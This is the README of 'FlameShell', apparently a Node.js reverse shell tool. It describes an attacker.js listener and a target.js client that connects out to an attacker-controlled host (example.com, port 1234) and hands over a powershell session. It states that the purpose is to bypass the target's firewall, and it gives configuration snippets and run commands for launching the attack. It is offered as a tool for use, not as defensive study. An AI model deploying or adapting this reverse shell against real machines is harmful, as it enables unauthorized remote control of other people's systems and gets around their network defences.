<p align="center"><img src="https://i.imgur.com/kPlyWR6.png"></p>

# FlameShell v1.0.0

<p>
  I was actually quite bored as I created this project (or something like that).
  This repository contains two scripts: attacker.js and target.js.
</p>
<p>
  The attacker.js script acts as the server and the target.js script acts as the client.
  A reverse shell is mostly used to bypass the target's firewall.
  Instead of the attacker connecting to the target, the target connects to the attacker.
</p>

## Installation

There is no need to install anything.
This script comes with absolutely no dependencies.
All you need is a node.js installation.

## Usage

1. Prepare
   <details>
    <summary>1. Configure the scripts</summary>
    Before you can use this script, you need change the settings in attacker.js and target.js to your needs.

    For example, if your domain is "example.com" and you want your targets to connect to port 1234 using powershell, you need to change the following lines in attacker.js:
    ```js
    #!/bin/node
    /* -------------------------------------------------------------------------- */
    /*                                   Server                                   */
    /* -------------------------------------------------------------------------- */

    /* -------------------------------- Settings -------------------------------- */

    // The port the server will listen on
    const port = 1234;

    ...
    ```

    And in target.js:
    ```js
    #!/bin/node
    /* -------------------------------------------------------------------------- */
    /*                                   Client                                   */
    /* -------------------------------------------------------------------------- */

    /* -------------------------------- Settings -------------------------------- */

    // The target server to connect to.
    const host = 'example.com';

    // The port to connect to.
    const port = 1234;

    // The shell you want to share.
    const shell = 'powershell';

    ...
    ```
   </details>

2. Attack
   <details>
    <summary>Run the scripts</summary>
    Now you can run the scripts.

    Start Server:
    ```bash
    $ node ./attacker.js
    ```

    Start Client:
    ```bash
    $ node ./target.js
    ```
   </details>

## Demo

<details>
  <summary>attacker.js</summary>
  <img src="https://i.imgur.com/GfMTd4r.gif">
</details>

<details>
  <summary>target.js</summary>
  <img src="https://i.imgur.com/ijZYm9D.gif">
</details>